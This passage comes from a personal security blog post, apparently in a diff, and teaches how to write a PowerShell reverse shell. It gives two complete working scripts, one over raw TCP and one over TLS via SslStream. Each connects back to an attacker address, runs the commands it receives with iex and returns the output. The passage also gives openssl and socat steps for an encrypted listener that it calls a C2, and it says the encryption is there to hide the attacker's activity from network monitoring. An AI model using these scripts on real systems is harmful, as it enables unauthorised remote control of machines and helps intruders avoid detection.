+</span></code></pre></div></div>
+
+<p>Very good, now we can send a bunch of bytes, run that and get the output, we now just need to run a loop to read until there is no more connections and send the output back!</p>
+
+<p>To send our messages back, we need to call the <strong><em>write</em></strong> method in our stream, it has the same arguments as the read, it gets the buffer to send, where to start and its size, but before sending data we need to be able to encode our string to send the all the bytes, this is easily accomplished by using the <strong><em>ASCII.GetBytes</em></strong> method, that requires the same arguments as <strong><em>GetString</em></strong>, you see ? Powershell is very modular and intuitive to pick-up, Oh for our while loop we will need to wait the -1 response from the <strong><em>Read</em></strong> method, because that indicate to our script that the connection was lost!</p>
+
+<p>So finally, our Powershell reverse shell from scratch is:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$target</span><span class="o">=</span><span class="s2">"172.16.110.129"</span><span class="w">
+</span><span class="nv">$port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">443</span><span class="w">
+
+</span><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">New-Object</span><span class="w"> </span><span class="nx">System.Net.Sockets.TcpClient</span><span class="p">;</span><span class="w">
+</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Connect</span><span class="p">(</span><span class="nv">$target</span><span class="p">,</span><span class="nv">$port</span><span class="p">)</span><span class="w">
+
+</span><span class="p">[</span><span class="kt">byte</span><span class="p">[]]</span><span class="nv">$buff</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="mi">4096</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="p">{</span><span class="mi">0</span><span class="nf">xff</span><span class="p">};</span><span class="w">
+</span><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">GetStream</span><span class="p">()</span><span class="w">
+
+
+</span><span class="kr">while</span><span class="w"> </span><span class="p">((</span><span class="nv">$size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$buff</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$buff</span><span class="o">.</span><span class="nf">Length</span><span class="p">))</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="nt">-1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c"># Until connection die</span><span class="w">
+    </span><span class="nv">$command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="no">System.Text.</span><span class="kt">ASCIIEncoding</span><span class="p">]::</span><span class="nf">ASCII.GetString</span><span class="p">(</span><span class="nv">$buff</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$size</span><span class="p">);</span><span class="w">
+    </span><span class="nv">$command_response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">iex</span><span class="w"> </span><span class="nv">$command</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">Out-String</span><span class="p">;</span><span class="w"> </span><span class="c"># Invoke-Expression shorten</span><span class="w">
+    </span><span class="nv">$command_back</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="no">System.Text.</span><span class="kt">ASCIIEncoding</span><span class="p">]::</span><span class="nf">ASCII.GetBytes</span><span class="p">(</span><span class="nv">$command_response</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$command_response</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="w">
+    </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Write</span><span class="p">(</span><span class="nv">$command_back</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$command_back</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+
+</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Close</span><span class="p">();</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="testing">Testing</h2>
+
+<p><img src="https://aandersonl.github.io/assets/images/reverse_shell/reverse_powershell.png" alt="" /></p>
+
+<p>So yeah, it’s works, with a few lines of code we achieve a reverse Powershell, why this is more powerfull than a simple cmd.exe binded over netcat ? Because Powershell is a entire scripting languange focused on Windows, with this shell you can load DLL’s in memory, execute your in-memory software and achieve administration commands!</p>
+
+<h1 id="encrypted-shells">Encrypted shells</h1>
+
+<p>Using a normal raw TCP shell is not a good idea because all of our traffic will be in plain text, you can implement your own encryption functions to save your inputs/outputs but the communication will still be able to be captured by some Network monitor, and that is not a good idea, because this can compromise the attacker and reveal his malicious activities, or these reasons, TLS/SSL is used for communications, this allows that our channel between the target will be fully encrypted and look just like a normal encrypted traffic.</p>
+
+<h2 id="tlsssl">TLS/SSL</h2>
+
+<p>Before dig in implementing an encrypted channel in our Powershell script and our C2, we need to understand what’s happening behind a TLS/SSL channel.</p>
+
+<p>TLS extends for Transport Layer Security, it’s designed to replace SSL(Secure Socket Layer), but as we still see both used in the wild, it’s sometimes called TLS/SSL for every secure channel that use one of them.</p>
+
+<p>The idea behind secure channels is find a way to encrypt all data in the traffic in a known cipher algorithm, such as <a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">Aes256</a>, <a href="https://en.wikipedia.org/wiki/Camellia_(cipher)">Camellia</a>, <a href="https://en.wikipedia.org/wiki/Triple_DES">3DES</a>, <a href="https://en.wikipedia.org/wiki/RC2">RC2</a> or some stream cipher, by default you will find in 90% cases the usage of AES256 + <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">GCM</a>.</p>
+
+<p>Every key exchange part happens after the TCP Handshake, so you can interpret that TLS/SSL channels run in the application that are using TCP for his connections, for every session (aka communication channel) is created an unique <a href="https://en.wikipedia.org/wiki/Shared_secret">shared secret</a> that are exchange between the two points using a <a href="https://en.wikipedia.org/wiki/Key_exchange">Key-Exchange Algorithm</a>, with this they can exchange a common key in a secure way. Every initial operation happen in a pre-encrypted channel using <a href="https://en.wikipedia.org/wiki/Public-key_cryptography">Asymmetric cryptography</a>.</p>
+
+<p>Public certifcates used for TLS/SSL connections are specified in <a href="https://tools.ietf.org/html/rfc5280">X.509</a> rfc, you still can use others certificates specifications, but the most used and supported is the X.509, in this model, the certificate comes with the public key used, a digital signature and metadata about the certificate, such a <a href="https://en.wikipedia.org/wiki/Certificate_authority">Certified Authority(CA)</a> to validate the certified veracity</p>
+
+<h3 id="certificate-creation">Certificate creation</h3>
+
+<p>In your Linux machine, make sure to have <strong><em>openssl</em></strong> and <strong><em>socat</em></strong> installed for this part, first, we need to setup a new certifcate with our public information and our public key for our client be able to encrypt the initial communication.</p>
+
+<p>Openssl command:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ openssl req -newkey rsa:2048 -nodes -x509 -keyout my_priv_key.pem -out my_cert.cert
+</code></pre></div></div>
+
+<ul>
+  <li>req: X.509 Certificate Signing Request (CSR) Management</li>
+  <li>-newkey: Create a RSA key-pair with 2048-bit</li>
+  <li>-nodes:  Don’t encrypt the ouput key</li>
+  <li>-x509:   Output a x509 structure instead of a cert request</li>
+  <li>-keyout: Output of our private key</li>
+  <li>-out: certificate output</li>
+</ul>
+
+<p>After you run this, there will be a couple of questions about the certificate, you can hit enter in everything. There will be now two files a <strong><em>.pem</em></strong> file and a <strong><em>.cert</em></strong> file, let’s impersonate this .cert file with the utility x509 of openssl package:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ openssl x509 -in my_cert.cert -text
+</code></pre></div></div>
+
+<p><img src="https://aandersonl.github.io/assets/images/reverse_shell/openssl_text.png" alt="" /></p>
+
+<p>This will show in text every information inside this x509 certificate, you can notice the importants parts here: RSA Public-Key, Signature Algorithm, Issuer information and Validity, this is all the information that our TLS/SSL lib will use to read that cert file, Ok, now lets continue!</p>
+
+<h3 id="encrypted-channel-with-socat">Encrypted channel with SOCAT</h3>
+
+<p>Now, as we have our certifcate and our private key generated, we can use SOCAT to listen for SSL connections using our cert file, socat expect that our private key be in the same file of our certficate (only for read porpuse of the software), so we need to concat everything inside another file, you can use cat for this:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat my_cert.cert my_priv_key.pem &gt; c2_cert.cert
+</code></pre></div></div>
+
+<p>Now lets run socat with this certifcate:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ socat -d -d - OPENSSL-LISTEN:443,cert=c2_cert.cert,verify=0,fork 
+</code></pre></div></div>
+
+<p>Now we are ready to make encrypted connections, lets first use the same openssl tool for connect to our C2, just for debugging porpuse</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ openssl s_client -connect 127.0.0.1:443
+</code></pre></div></div>
+
+<p><img src="https://aandersonl.github.io/assets/images/reverse_shell/ssl_channel.png" alt="" /></p>
+
+<p>Note that a bunch of information in the TLS/SSL handshake appears in the screen, but after the two hosts successfully exchange their sessions keys (PSK), a secure channel is established, and now we can work just like we are working with our netcat!</p>
+
+<h3 id="ssl-stream-in-powershell">SSL stream in Powershell</h3>
+
+<p>Now, let’s modify a little our code to use an SSL stream in the connection instead a raw TCP connection.</p>
+
+<p>We will use the <a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.security.sslstream?view=netcore-3.1">System.Net.Security.SslStream</a> for this, in this .NET class we have a few constructors available, but we will use the <strong><em>SslStream(Stream, Boolean, RemoteCertificateValidationCallback)</em></strong> which give us the ability to defined our own verification function to the certificate, we do this because we don’t want to verify the validity of this cert. The new snippet will look like this:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">New-Object</span><span class="w"> </span><span class="nx">System.Net.Security.SslStream</span><span class="p">(</span><span class="nv">$client</span><span class="o">.</span><span class="nf">GetStream</span><span class="p">(),</span><span class="w"> </span><span class="bp">$false</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="bp">$true</span><span class="p">},</span><span class="w"> </span><span class="bp">$null</span><span class="p">);</span><span class="w">
+</span><span class="nv">$stream</span><span class="o">.</span><span class="nf">AuthenticateAsClient</span><span class="p">(</span><span class="nv">$target</span><span class="p">);</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Note that we pass our current stream, false to leaveInnerStreamOpen(second argument), and a anonymous function that always return <strong><em>true</em></strong> in the certificate verification process and null to userCertificateSelectionCallback parameter.</p>
+
+<p>With this we have a fully encrypted channel between our target and the attacker.</p>
+
+<p>Reverse SSL Powershell code:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$target</span><span class="o">=</span><span class="s2">"172.16.110.129"</span><span class="w">
+</span><span class="nv">$port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">443</span><span class="w">
+
+</span><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">New-Object</span><span class="w"> </span><span class="nx">System.Net.Sockets.TcpClient</span><span class="p">;</span><span class="w">
+</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Connect</span><span class="p">(</span><span class="nv">$target</span><span class="p">,</span><span class="nv">$port</span><span class="p">)</span><span class="w">
+
+</span><span class="p">[</span><span class="kt">byte</span><span class="p">[]]</span><span class="nv">$buff</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="mi">4096</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="p">{</span><span class="mi">0</span><span class="nf">xff</span><span class="p">};</span><span class="w">
+</span><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">New-Object</span><span class="w"> </span><span class="nx">System.Net.Security.SslStream</span><span class="p">(</span><span class="nv">$client</span><span class="o">.</span><span class="nf">GetStream</span><span class="p">(),</span><span class="w"> </span><span class="bp">$false</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="bp">$true</span><span class="p">},</span><span class="w"> </span><span class="bp">$null</span><span class="p">);</span><span class="w">
+ 
+</span><span class="nv">$stream</span><span class="o">.</span><span class="nf">AuthenticateAsClient</span><span class="p">(</span><span class="nv">$target</span><span class="p">);</span><span class="w">
+
+
+</span><span class="kr">while</span><span class="w"> </span><span class="p">((</span><span class="nv">$size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$buff</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$buff</span><span class="o">.</span><span class="nf">Length</span><span class="p">))</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="nt">-1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c"># Until connection die</span><span class="w">
+    </span><span class="nv">$command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="no">System.Text.</span><span class="kt">ASCIIEncoding</span><span class="p">]::</span><span class="nf">ASCII.GetString</span><span class="p">(</span><span class="nv">$buff</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$size</span><span class="p">);</span><span class="w">
+    </span><span class="nv">$command_response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">iex</span><span class="w"> </span><span class="nv">$command</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">Out-String</span><span class="p">;</span><span class="w"> </span><span class="c"># Invoke-Expression shorten</span><span class="w">
+    </span><span class="nv">$command_back</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="no">System.Text.</span><span class="kt">ASCIIEncoding</span><span class="p">]::</span><span class="nf">ASCII.GetBytes</span><span class="p">(</span><span class="nv">$command_response</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$command_response</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="w">
+    </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Write</span><span class="p">(</span><span class="nv">$command_back</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$command_back</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+
+</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Close</span><span class="p">();</span><span class="w">
+</span></code></pre></div></div>
+
+<p>That’s all folks.</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/cybersec" class="page__taxonomy-item" rel="tag">cybersec</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/powershell" class="page__taxonomy-item" rel="tag">powershell</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/programming" class="page__taxonomy-item" rel="tag">programming</a>
+    
+    </span>
+  </p>
+
+
+        
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-06-14T21:31:36+00:00">June 14, 2020</time></p>
+
+
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/cybersec/programming/bipartite-graph-for-threats/" class="pagination--pager" title="Using bipartite Graphs to detect Malware campaigns
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+      
+        
+          <li><a href="https://github.com/aandersonl" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+        
+          <li><a href="https://br.linkedin.com/in/anderson-leite-6886b117a" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> Linkedin</a></li>
+        
+      
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2020 $ Bit escape. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+  </body>
+</html>
